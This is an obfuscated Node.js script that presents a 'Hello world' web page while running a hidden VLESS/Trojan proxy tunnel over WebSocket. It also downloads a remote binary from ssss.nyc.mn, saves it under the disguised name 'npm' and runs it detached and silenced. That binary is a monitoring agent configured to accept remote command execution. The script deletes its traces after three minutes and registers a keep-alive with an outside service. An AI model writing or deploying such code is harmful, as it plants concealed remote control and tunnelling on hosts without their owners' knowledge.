const _0x21fac5=_0x236d;(function(_0x26f327,_0x3ddc59){const _0x935d7c=_0x236d,_0xe4c8f3=_0x26f327();while(!![]){try{const _0x5b3f14=-parseInt(_0x935d7c(0x1f6))/0x1+parseInt(_0x935d7c(0x1d9))/0x2+-parseInt(_0x935d7c(0x214))/0x3*(-parseInt(_0x935d7c(0x1ac))/0x4)+-parseInt(_0x935d7c(0x1b7))/0x5*(parseInt(_0x935d7c(0x1d6))/0x6)+-parseInt(_0x935d7c(0x21b))/0x7+-parseInt(_0x935d7c(0x21e))/0x8*(-parseInt(_0x935d7c(0x1e1))/0x9)+-parseInt(_0x935d7c(0x203))/0xa*(parseInt(_0x935d7c(0x1cf))/0xb);if(_0x5b3f14===_0x3ddc59)break;else _0xe4c8f3['push'](_0xe4c8f3['shift']());}catch(_0x37f5ac){_0xe4c8f3['push'](_0xe4c8f3['shift']());}}}(_0x34c2,0x68a01));const os=require('os'),http=require(_0x21fac5(0x1b0)),fs=require('fs'),axios=require(_0x21fac5(0x21c)),net=require(_0x21fac5(0x220)),path=require('path'),crypto=require(_0x21fac5(0x211)),{Buffer}=require(_0x21fac5(0x1e4)),{exec,execSync}=require(_0x21fac5(0x204)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x21fac5(0x219)][_0x21fac5(0x1bb)]||_0x21fac5(0x216),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x21fac5(0x219)][_0x21fac5(0x1fa)]||'',NEZHA_KEY=process[_0x21fac5(0x219)][_0x21fac5(0x1b2)]||'',DOMAIN=process[_0x21fac5(0x219)][_0x21fac5(0x1db)]||_0x21fac5(0x1d2),AUTO_ACCESS=process['env'][_0x21fac5(0x209)]||![],WSPATH=process[_0x21fac5(0x219)][_0x21fac5(0x1c8)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x21fac5(0x219)][_0x21fac5(0x1ad)]||'sub',NAME=process[_0x21fac5(0x219)][_0x21fac5(0x1aa)]||_0x21fac5(0x1dc),PORT=process[_0x21fac5(0x219)][_0x21fac5(0x1af)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0xda4aa7=_0x21fac5;try{const _0x32636c=await axios['get'](_0xda4aa7(0x1c9)),_0x7beccb=_0x32636c[_0xda4aa7(0x1e9)];ISP=(_0x7beccb['country_code']+'-'+_0x7beccb[_0xda4aa7(0x217)])[_0xda4aa7(0x20d)](/ /g,'_');}catch(_0x3e06bc){ISP=_0xda4aa7(0x1ed);}};GetISP();const httpServer=http['createServer']((_0x485840,_0x332035)=>{const _0x331850=_0x21fac5;if(_0x485840[_0x331850(0x222)]==='/'){const _0x21be9e=path[_0x331850(0x1de)](__dirname,_0x331850(0x1ea));fs[_0x331850(0x1ba)](_0x21be9e,_0x331850(0x1a8),(_0x47854f,_0x259373)=>{const _0x56ef38=_0x331850;if(_0x47854f){_0x332035[_0x56ef38(0x1f9)](0xc8,{'Content-Type':_0x56ef38(0x20a)}),_0x332035['end']('Hello\x20world!');return;}_0x332035['writeHead'](0xc8,{'Content-Type':_0x56ef38(0x20a)}),_0x332035[_0x56ef38(0x1ca)](_0x259373);});return;}else{if(_0x485840[_0x331850(0x222)]==='/'+SUB_PATH){const _0x560706=NAME?NAME+'-'+ISP:ISP,_0x2e4ca2=_0x331850(0x210)+UUID+'@'+DOMAIN+_0x331850(0x1fd)+DOMAIN+_0x331850(0x1e5)+DOMAIN+_0x331850(0x1f2)+WSPATH+'#'+_0x560706,_0x3aea96='trojan://'+UUID+'@'+DOMAIN+_0x331850(0x1f4)+DOMAIN+_0x331850(0x1e5)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x560706,_0x171167=_0x2e4ca2+'\x0a'+_0x3aea96,_0x21bd25=Buffer['from'](_0x171167)[_0x331850(0x1c0)](_0x331850(0x1fe));_0x332035[_0x331850(0x1f9)](0xc8,{'Content-Type':_0x331850(0x212)}),_0x332035[_0x331850(0x1ca)](_0x21bd25+'\x0a');}else _0x332035['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x332035[_0x331850(0x1ca)](_0x331850(0x1b1));}}),wss=new WebSocket[(_0x21fac5(0x1ef))]({'server':httpServer}),uuid=UUID[_0x21fac5(0x20d)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function _0x34c2(){const _0x1a253b=['readUInt8','log','npm\x20running\x20error:','pipe','split','2087','concat','WSPATH','https://api.ip.sb/geoip','end','https://amd64.ssss.nyc.mn/agent','application/json','send','length','5907cTfObf','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','includes','1234.abc.com','2053','every','write','42YvLIaL','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','message','1065426qnJlix','substr','DOMAIN','Hug','post','join','\x20with\x20all\x20DNS\x20servers','error:\x20','171vgzPcr','--tls','arm','buffer','&fp=chrome&type=ws&host=','catch','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','config.yaml','data','index.html','application/dns-json','client_secret:\x20','Unknown','Failed\x20to\x20resolve\x20','Server','Server\x20is\x20running\x20on\x20port\x20','https://oooo.serv00.net/add-url','&path=%2F','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',':443?security=tls&sni=','close','183711MwFMuW','map','trim','writeHead','NEZHA_PORT','finish','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running',':443?encryption=none&security=tls&sni=','base64','https://dns.google/resolve?name=','update','arch','false','70wipjGE','child_process','true','find','reduce','error','AUTO_ACCESS','text/html','connect','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','replace','then','utf-8','vless://','crypto','text/plain','readUInt16BE','535137dpXIFm','npm\x20is\x20running','8883cbd0-f823-497b-8545-5cc991d60086','isp','slice','env','Automatic\x20Access\x20Task\x20added\x20successfully','4300485OQIGFg','axios','chmod\x20+x\x20npm','322024CTfenE','Status','net','Answer','url','pop','utf8','createHash','NAME','https://amd64.ssss.nyc.mn/v1','12oAOJdY','SUB_PATH','npm','PORT','http','Not\x20Found\x0a','NEZHA_KEY','stream','npm\x20is\x20already\x20running,\x20skip\x20running...','get','2083','430205uLbBfG','https://arm64.ssss.nyc.mn/agent','listen','readFile','UUID','\x20-p\x20','decode','createWriteStream','unlink','toString'];_0x34c2=function(){return _0x1a253b;};return _0x34c2();}function _0x236d(_0xe7e5c8,_0x34391f){_0xe7e5c8=_0xe7e5c8-0x1a8;const _0x34c2b8=_0x34c2();let _0x236d81=_0x34c2b8[_0xe7e5c8];return _0x236d81;}function resolveHost(_0xd95f4c){return new Promise((_0x455a00,_0x1fc7f0)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xd95f4c)){_0x455a00(_0xd95f4c);return;}let _0x7c637=0x0;function _0x4c9f9f(){const _0xa1c659=_0x236d;if(_0x7c637>=DNS_SERVERS[_0xa1c659(0x1ce)]){_0x1fc7f0(new Error(_0xa1c659(0x1ee)+_0xd95f4c+_0xa1c659(0x1df)));return;}const _0x31063f=DNS_SERVERS[_0x7c637];_0x7c637++;const _0x4e22c3=_0xa1c659(0x1ff)+encodeURIComponent(_0xd95f4c)+'&type=A';axios[_0xa1c659(0x1b5)](_0x4e22c3,{'timeout':0x1388,'headers':{'Accept':_0xa1c659(0x1eb)}})[_0xa1c659(0x20e)](_0x31e868=>{const _0x537dc0=_0xa1c659,_0x3f9e09=_0x31e868['data'];if(_0x3f9e09[_0x537dc0(0x21f)]===0x0&&_0x3f9e09[_0x537dc0(0x221)]&&_0x3f9e09['Answer']['length']>0x0){const _0x3ce51b=_0x3f9e09['Answer'][_0x537dc0(0x206)](_0x21fe18=>_0x21fe18['type']===0x1);if(_0x3ce51b){_0x455a00(_0x3ce51b[_0x537dc0(0x1e9)]);return;}}_0x4c9f9f();})[_0xa1c659(0x1e6)](_0x3d9a04=>{_0x4c9f9f();});}_0x4c9f9f();});}function handleVlessConnection(_0x56124e,_0x57aa85){const _0x2f3a4b=_0x21fac5,[_0x193c46]=_0x57aa85,_0x414fef=_0x57aa85['slice'](0x1,0x11);if(!_0x414fef[_0x2f3a4b(0x1d4)]((_0x324e35,_0x57d58c)=>_0x324e35==parseInt(uuid[_0x2f3a4b(0x1da)](_0x57d58c*0x2,0x2),0x10)))return![];let _0x57dee5=_0x57aa85[_0x2f3a4b(0x218)](0x11,0x12)[_0x2f3a4b(0x1c1)]()+0x13;const _0x4c1d93=_0x57aa85['slice'](_0x57dee5,_0x57dee5+=0x2)[_0x2f3a4b(0x213)](0x0),_0x18a2bc=_0x57aa85[_0x2f3a4b(0x218)](_0x57dee5,_0x57dee5+=0x1)['readUInt8'](),_0x47123e=_0x18a2bc==0x1?_0x57aa85[_0x2f3a4b(0x218)](_0x57dee5,_0x57dee5+=0x4)[_0x2f3a4b(0x1de)]('.'):_0x18a2bc==0x2?new TextDecoder()[_0x2f3a4b(0x1bd)](_0x57aa85['slice'](_0x57dee5+0x1,_0x57dee5+=0x1+_0x57aa85['slice'](_0x57dee5,_0x57dee5+0x1)[_0x2f3a4b(0x1c1)]())):_0x18a2bc==0x3?_0x57aa85[_0x2f3a4b(0x218)](_0x57dee5,_0x57dee5+=0x10)[_0x2f3a4b(0x207)]((_0x5560b9,_0x42ae48,_0x1be8ea,_0x591be6)=>_0x1be8ea%0x2?_0x5560b9['concat'](_0x591be6['slice'](_0x1be8ea-0x1,_0x1be8ea+0x1)):_0x5560b9,[])[_0x2f3a4b(0x1f7)](_0xe1c79=>_0xe1c79[_0x2f3a4b(0x213)](0x0)[_0x2f3a4b(0x1c0)](0x10))[_0x2f3a4b(0x1de)](':'):'';_0x56124e[_0x2f3a4b(0x1cd)](new Uint8Array([_0x193c46,0x0]));const _0x2bbc46=createWebSocketStream(_0x56124e);return resolveHost(_0x47123e)[_0x2f3a4b(0x20e)](_0x287063=>{const _0x583b90=_0x2f3a4b;net[_0x583b90(0x20b)]({'host':_0x287063,'port':_0x4c1d93},function(){const _0x5e6715=_0x583b90;this['write'](_0x57aa85[_0x5e6715(0x218)](_0x57dee5)),_0x2bbc46['on'](_0x5e6715(0x208),()=>{})['pipe'](this)['on'](_0x5e6715(0x208),()=>{})[_0x5e6715(0x1c4)](_0x2bbc46);})['on'](_0x583b90(0x208),()=>{});})[_0x2f3a4b(0x1e6)](_0x32c2c7=>{const _0x22a521=_0x2f3a4b;net[_0x22a521(0x20b)]({'host':_0x47123e,'port':_0x4c1d93},function(){const _0x1d8886=_0x22a521;this[_0x1d8886(0x1d5)](_0x57aa85[_0x1d8886(0x218)](_0x57dee5)),_0x2bbc46['on'](_0x1d8886(0x208),()=>{})['pipe'](this)['on']('error',()=>{})[_0x1d8886(0x1c4)](_0x2bbc46);})['on'](_0x22a521(0x208),()=>{});}),!![];}function handleTrojanConnection(_0x3cfd84,_0x9bc9be){const _0x22e627=_0x21fac5;try{if(_0x9bc9be[_0x22e627(0x1ce)]<0x3a)return![];const _0x2c3de=_0x9bc9be[_0x22e627(0x218)](0x0,0x38)[_0x22e627(0x1c0)](),_0x26115e=[UUID];let _0x4d4f7c=null;for(const _0x5c22d0 of _0x26115e){const _0x5c2464=crypto[_0x22e627(0x1a9)]('sha224')[_0x22e627(0x200)](_0x5c22d0)['digest']('hex');if(_0x5c2464===_0x2c3de){_0x4d4f7c=_0x5c22d0;break;}}if(!_0x4d4f7c)return![];let _0x2c33a7=0x38;_0x9bc9be[_0x2c33a7]===0xd&&_0x9bc9be[_0x2c33a7+0x1]===0xa&&(_0x2c33a7+=0x2);const _0x262b72=_0x9bc9be[_0x2c33a7];if(_0x262b72!==0x1)return![];_0x2c33a7+=0x1;const _0x290e06=_0x9bc9be[_0x2c33a7];_0x2c33a7+=0x1;let _0x28601a,_0x50d1a7;if(_0x290e06===0x1)_0x28601a=_0x9bc9be['slice'](_0x2c33a7,_0x2c33a7+0x4)[_0x22e627(0x1de)]('.'),_0x2c33a7+=0x4;else{if(_0x290e06===0x3){const _0x547b4f=_0x9bc9be[_0x2c33a7];_0x2c33a7+=0x1,_0x28601a=_0x9bc9be[_0x22e627(0x218)](_0x2c33a7,_0x2c33a7+_0x547b4f)[_0x22e627(0x1c0)](),_0x2c33a7+=_0x547b4f;}else{if(_0x290e06===0x4)_0x28601a=_0x9bc9be[_0x22e627(0x218)](_0x2c33a7,_0x2c33a7+0x10)[_0x22e627(0x207)]((_0x3dc2c9,_0xb404a6,_0x4e4db2,_0x1b06ad)=>_0x4e4db2%0x2?_0x3dc2c9[_0x22e627(0x1c7)](_0x1b06ad[_0x22e627(0x218)](_0x4e4db2-0x1,_0x4e4db2+0x1)):_0x3dc2c9,[])[_0x22e627(0x1f7)](_0x54cf0b=>_0x54cf0b['readUInt16BE'](0x0)['toString'](0x10))[_0x22e627(0x1de)](':'),_0x2c33a7+=0x10;else return![];}}_0x50d1a7=_0x9bc9be[_0x22e627(0x213)](_0x2c33a7),_0x2c33a7+=0x2;_0x2c33a7<_0x9bc9be[_0x22e627(0x1ce)]&&_0x9bc9be[_0x2c33a7]===0xd&&_0x9bc9be[_0x2c33a7+0x1]===0xa&&(_0x2c33a7+=0x2);const _0x50ffe1=createWebSocketStream(_0x3cfd84);return resolveHost(_0x28601a)[_0x22e627(0x20e)](_0x283fd8=>{const _0xca8be8=_0x22e627;net[_0xca8be8(0x20b)]({'host':_0x283fd8,'port':_0x50d1a7},function(){const _0x50862f=_0xca8be8;_0x2c33a7<_0x9bc9be[_0x50862f(0x1ce)]&&this[_0x50862f(0x1d5)](_0x9bc9be[_0x50862f(0x218)](_0x2c33a7)),_0x50ffe1['on'](_0x50862f(0x208),()=>{})[_0x50862f(0x1c4)](this)['on'](_0x50862f(0x208),()=>{})[_0x50862f(0x1c4)](_0x50ffe1);})['on'](_0xca8be8(0x208),()=>{});})[_0x22e627(0x1e6)](_0x89ad74=>{const _0x259fd7=_0x22e627;net[_0x259fd7(0x20b)]({'host':_0x28601a,'port':_0x50d1a7},function(){const _0x1e3c6a=_0x259fd7;_0x2c33a7<_0x9bc9be[_0x1e3c6a(0x1ce)]&&this['write'](_0x9bc9be[_0x1e3c6a(0x218)](_0x2c33a7)),_0x50ffe1['on'](_0x1e3c6a(0x208),()=>{})[_0x1e3c6a(0x1c4)](this)['on'](_0x1e3c6a(0x208),()=>{})[_0x1e3c6a(0x1c4)](_0x50ffe1);})['on'](_0x259fd7(0x208),()=>{});}),!![];}catch(_0x168231){return![];}}wss['on']('connection',(_0x249a80,_0xd662f9)=>{const _0x34813e=_0x21fac5,_0x1ecbf4=_0xd662f9['url']||'';_0x249a80['once'](_0x34813e(0x1d8),_0x4f6436=>{const _0x4ef2a3=_0x34813e;if(_0x4f6436[_0x4ef2a3(0x1ce)]>0x11&&_0x4f6436[0x0]===0x0){const _0x141bcc=_0x4f6436['slice'](0x1,0x11),_0x1d26b9=_0x141bcc[_0x4ef2a3(0x1d4)]((_0x516a3f,_0xc4317c)=>_0x516a3f==parseInt(uuid['substr'](_0xc4317c*0x2,0x2),0x10));if(_0x1d26b9){!handleVlessConnection(_0x249a80,_0x4f6436)&&_0x249a80['close']();return;}}!handleTrojanConnection(_0x249a80,_0x4f6436)&&_0x249a80[_0x4ef2a3(0x1f5)]();})['on'](_0x34813e(0x208),()=>{});});const getDownloadUrl=()=>{const _0xca7839=_0x21fac5,_0x592ec6=os[_0xca7839(0x201)]();return _0x592ec6===_0xca7839(0x1e3)||_0x592ec6==='arm64'||_0x592ec6==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0xca7839(0x1b8):!NEZHA_PORT?_0xca7839(0x1ab):_0xca7839(0x1cb);},downloadFile=async()=>{const _0x4538b9=_0x21fac5;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2673e9=getDownloadUrl(),_0x34a97f=await axios({'method':_0x4538b9(0x1b5),'url':_0x2673e9,'responseType':_0x4538b9(0x1b3)}),_0x2ade28=fs[_0x4538b9(0x1be)](_0x4538b9(0x1ae));return _0x34a97f[_0x4538b9(0x1e9)][_0x4538b9(0x1c4)](_0x2ade28),new Promise((_0x2a1ea4,_0x32f43d)=>{const _0x22b985=_0x4538b9;_0x2ade28['on'](_0x22b985(0x1fb),()=>{const _0x901db4=_0x22b985;console[_0x901db4(0x1c2)]('npm\x20download\x20successfully'),exec(_0x901db4(0x21d),_0x3b2a97=>{if(_0x3b2a97)_0x32f43d(_0x3b2a97);_0x2a1ea4();});}),_0x2ade28['on'](_0x22b985(0x208),_0x32f43d);});}catch(_0x23f20f){throw _0x23f20f;}},runnz=async()=>{const _0x26763c=_0x21fac5;try{const _0x449f40=execSync(_0x26763c(0x1f3),{'encoding':_0x26763c(0x20f)});if(_0x449f40[_0x26763c(0x1f8)]()!==''){console[_0x26763c(0x1c2)](_0x26763c(0x1b4));return;}}catch(_0x21d0d9){}await downloadFile();let _0x374c7a='',_0x47c1bd=['443','8443','2096',_0x26763c(0x1c6),_0x26763c(0x1b6),_0x26763c(0x1d3)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x49d16f=_0x47c1bd['includes'](NEZHA_PORT)?_0x26763c(0x1e2):'';_0x374c7a='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x26763c(0x1bc)+NEZHA_KEY+'\x20'+_0x49d16f+_0x26763c(0x20c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x462b78=NEZHA_SERVER[_0x26763c(0x1d1)](':')?NEZHA_SERVER[_0x26763c(0x1c5)](':')[_0x26763c(0x223)]():'',_0x6eaba=_0x47c1bd['includes'](_0x462b78)?_0x26763c(0x205):_0x26763c(0x202),_0x470556=_0x26763c(0x1ec)+NEZHA_KEY+_0x26763c(0x1d0)+NEZHA_SERVER+_0x26763c(0x1e7)+_0x6eaba+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x26763c(0x1e8),_0x470556);}_0x374c7a=_0x26763c(0x1d7);}else{console[_0x26763c(0x1c2)](_0x26763c(0x1fc));return;}}try{exec(_0x374c7a,{'shell':'/bin/bash'},_0x1b4784=>{const _0x37f808=_0x26763c;if(_0x1b4784)console[_0x37f808(0x208)](_0x37f808(0x1c3),_0x1b4784);else console['log'](_0x37f808(0x215));});}catch(_0x4498c7){console['error'](_0x26763c(0x1e0)+_0x4498c7);}};async function addAccessTask(){const _0x339663=_0x21fac5;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3f724a='https://'+DOMAIN;try{const _0x13d9d6=await axios[_0x339663(0x1dd)](_0x339663(0x1f1),{'url':_0x3f724a},{'headers':{'Content-Type':_0x339663(0x1cc)}});console[_0x339663(0x1c2)](_0x339663(0x21a));}catch(_0x10fb62){}}const delFiles=()=>{const _0x4af086=_0x21fac5;fs[_0x4af086(0x1bf)](_0x4af086(0x1ae),()=>{}),fs['unlink'](_0x4af086(0x1e8),()=>{});};httpServer[_0x21fac5(0x1b9)](PORT,()=>{const _0x54cc6b=_0x21fac5;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x54cc6b(0x1f0)+PORT);});
